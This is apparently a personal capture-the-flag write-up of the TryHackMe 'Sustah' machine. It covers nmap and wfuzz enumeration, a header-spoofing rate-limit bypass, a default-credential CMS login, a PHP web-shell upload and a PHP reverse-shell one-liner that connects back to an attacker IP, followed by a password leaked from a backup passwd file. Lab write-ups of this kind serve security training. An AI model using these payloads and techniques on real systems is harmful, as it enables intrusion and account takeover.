# ip addr `10.10.141.8`

# Date 23-05-24 || Rohit Tiwari [22:54]

## PORTS TO TRY

```
============================================
PORT 22 : look for cred , bruteforce hydra

============================================
80 : apache -- check for fuzzing,source code and robo.txt

=============================================
8085: CMS--fuzzing--source code and robo.txt
=============================================
3389 RPC:
```

# Nmap scan

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Sustah_10.10.141.8]
└─$ sudo nmap -sVC -v -A $ip -T4 -oN Sustah_nmap_scan   
[sudo] password for dedrknex: 
Sorry, try again.
[sudo] password for dedrknex: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 23:10 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 23:10
Completed NSE at 23:10, 0.00s elapsed
Initiating NSE at 23:10
Completed NSE at 23:10, 0.00s elapsed
Initiating NSE at 23:10
Completed NSE at 23:10, 0.00s elapsed
Initiating Ping Scan at 23:10
Scanning 10.10.141.8 [4 ports]
Completed Ping Scan at 23:10, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:10
Completed Parallel DNS resolution of 1 host. at 23:10, 0.03s elapsed
Initiating SYN Stealth Scan at 23:10
Scanning 10.10.141.8 [1000 ports]
Discovered open port 80/tcp on 10.10.141.8
Discovered open port 22/tcp on 10.10.141.8
Discovered open port 8085/tcp on 10.10.141.8
Completed SYN Stealth Scan at 23:10, 1.71s elapsed (1000 total ports)
Initiating Service scan at 23:10
Scanning 3 services on 10.10.141.8
Completed Service scan at 23:10, 6.40s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.141.8
Initiating Traceroute at 23:10
Completed Traceroute at 23:10, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 23:10
Completed Parallel DNS resolution of 2 hosts. at 23:10, 0.03s elapsed
NSE: Script scanning 10.10.141.8.
Initiating NSE at 23:10
Completed NSE at 23:10, 4.91s elapsed
Initiating NSE at 23:10
Completed NSE at 23:10, 0.69s elapsed
Initiating NSE at 23:10
Completed NSE at 23:10, 0.00s elapsed
Nmap scan report for 10.10.141.8
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Susta
8085/tcp open  http    Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD POST
|_http-server-header: gunicorn/20.0.4
|_http-title: Spinner
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Uptime guess: 0.008 days (since Thu May 23 22:58:21 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```


# PORT 80

>On checking port found nothing new a simple apche sevrer wiht web hosted in it

![](Attachments/Pasted%20image%2020240523231804.png)

on fuzzing it found some interesting dir/files like .php wp-formus

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Sustah_10.10.141.8]
└─$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 100 "http://$ip/FUZZ" 

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.141.8/FUZZ
Total requests: 17129

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                
=====================================================================

000000149:   403        9 L      28 W       276 Ch      ".htaccess"                            
000000371:   200        28 L     61 W       678 Ch      "."                                    
000000061:   200        28 L     61 W       678 Ch      "index.html"                           
000000529:   403        9 L      28 W       276 Ch      ".html"                                
000000798:   403        9 L      28 W       276 Ch      ".php"                                 
000001556:   403        9 L      28 W       276 Ch      ".htpasswd"                            
000001822:   403        9 L      28 W       276 Ch      ".htm"                                 
000002092:   403        9 L      28 W       276 Ch      ".htpasswds"                           
000004616:   403        9 L      28 W       276 Ch      ".htgroup"                             
000005163:   403        9 L      28 W       276 Ch      "wp-forum.phps"                        
000007069:   403        9 L      28 W       276 Ch      ".htaccess.bak"                        
000008678:   403        9 L      28 W       276 Ch      ".htuser"                              
000011450:   403        9 L      28 W       276 Ch      ".htc"                                 
000011449:   403        9 L      28 W       276 Ch      ".ht"                                  

Total time: 0
Processed Requests: 17129
Filtered Requests: 17115
Requests/sec.: 0

```


>Tried more enumeration but no luck found nothing

# PORT 8085

> After port 80 moved to 8085 found a website "hosted a spining game"
> captured the req using burp

![](Attachments/Pasted%20image%2020240524003532.png)

![](Attachments/Pasted%20image%2020240524003550.png)

>okay so there's a number filed which take a number and matches with the psin num but if we add 4 dig num on respsonse the X-RateLimit-Remaining is decreasing 



Now have to bypass the reate limit found one blog from medium used that bypassed successfully and found the num "https://infosecwriteups.com/bypassing-rate-limit-like-a-pro-5f3e40250d3c"


with bruteforce number and X-Remote-Addr:$ip with header bypasswd the x rate limit
![](Attachments/Pasted%20image%2020240524010133.png)




![](Attachments/Pasted%20image%2020240524010017.png)


pasted the path in port 80 found CMS "http://10.10.141.8/YouGotTh3P@th/"

![](Attachments/Pasted%20image%2020240524010451.png)
![](Attachments/Pasted%20image%2020240524010521.png)

GOT MARA CMS

> used login to login admin:changme

helloworld@1


now created a shell.php

![](Attachments/Pasted%20image%2020240524012551.png)

uploaded the file to "http://10.10.17.156/YouGotTh3P@th/codebase/dir.php?type=filenew"

![](Attachments/Pasted%20image%2020240524012642.png)

uplaoded it and got RCE
![](Attachments/Pasted%20image%2020240524012755.png)

![](Attachments/Pasted%20image%2020240524012802.png)


# INTIAL SHELL

> used php revshell in burp and got revershell
> payload : php -r '$sock=fsockopen("10.9.237.141",2929);shell_exec("sh <&3 >&3 2>&3");'

![](Attachments/Pasted%20image%2020240524013243.png)


![](Attachments/Pasted%20image%2020240524013341.png)

got passwd for kiran user on /var/backups/

```bash

www-data@ubuntu-xenial:/var$ cd backups/
www-data@ubuntu-xenial:/var/backups$ l
l: command not found
www-data@ubuntu-xenial:/var/backups$ ls
alternatives.tar.0	  dpkg.diversions.0    group.bak    shadow.bak
apt.extended_states.0	  dpkg.statoverride.0  gshadow.bak
apt.extended_states.1.gz  dpkg.status.0        passwd.bak
www-data@ubuntu-xenial:/var/backups$ cat passwd.bak 
cat: passwd.bak: Permission denied
www-data@ubuntu-xenial:/var/backups$ ls -la
total 636
drwxr-xr-x  2 root root     4096 Dec  9  2020 .
drwxr-xr-x 14 root root     4096 Dec  6  2020 ..
-r--r--r--  1 root root     1722 Dec  6  2020 .bak.passwd
-rw-r--r--  1 root root    51200 Dec  6  2020 alternatives.tar.0
-rw-r--r--  1 root root     6308 Dec  9  2020 apt.extended_states.0
-rw-r--r--  1 root root      715 Dec  6  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root      509 Nov 12  2020 dpkg.diversions.0
-rw-r--r--  1 root root      207 Dec  6  2020 dpkg.statoverride.0
-rw-r--r--  1 root root   547201 Dec  6  2020 dpkg.status.0
-rw-------  1 root root      849 Dec  6  2020 group.bak
-rw-------  1 root shadow    714 Dec  6  2020 gshadow.bak
-rw-------  1 root root     1695 Dec  6  2020 passwd.bak
-rw-------  1 root shadow   1031 Dec  6  2020 shadow.bak
www-data@ubuntu-xenial:/var/backups$ cat .bak.passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
kiran:x:1002:1002:trythispasswordforuserkiran:/home/kiran:
www-data@ubuntu-xenial:/var/backups$ su kiran
Password: 
kiran@ubuntu-xenial:/var/backups$ id
uid=1002(kiran) gid=1002(kiran) groups=1002(kiran)
kiran@ubuntu-xenial:/var/backups$ 


```


